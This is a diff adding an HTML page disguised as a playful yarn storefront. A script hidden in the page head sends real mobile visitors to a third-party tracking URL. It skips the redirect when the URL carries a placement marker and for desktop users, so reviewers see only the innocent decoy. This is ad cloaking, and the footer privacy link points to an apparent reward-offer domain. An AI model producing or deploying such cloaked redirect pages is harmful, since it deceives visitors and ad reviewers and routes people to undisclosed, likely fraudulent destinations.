@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Yarn Emporium</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #ff9900;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        .yarn-item {
+            background-color: rgba(255, 255, 255, 0.8);
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+        }
+        footer {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        a {
+            color: #ff00ff;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>🧶 Cosmic Yarn Emporium 🌌</h1>
+    </header>
+    <main>
+        <div class="yarn-item">
+            <h2>Nebula Nylon</h2>
+            <p>Sparkly space-inspired yarn!</p>
+        </div>
+        <div class="yarn-item">
+            <h2>Supernova Silk</h2>
+            <p>Exploding with color and softness!</p>
+        </div>
+        <div class="yarn-item">
+            <h2>Galactic Glow-in-the-Dark</h2>
+            <p>For nighttime knitting adventures!</p>
+        </div>
+        <div class="yarn-item">
+            <h2>Asteroid Alpaca</h2>
+            <p>Out-of-this-world warmth!</p>
+        </div>
+        <div class="yarn-item">
+            <h2>Martian Merino</h2>
+            <p>Red planet-inspired wool!</p>
+        </div>
+        <div class="yarn-item">
+            <h2>Comet Cotton</h2>
+            <p>Streaks of stellar softness!</p>
+        </div>
+    </main>
+    <footer>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
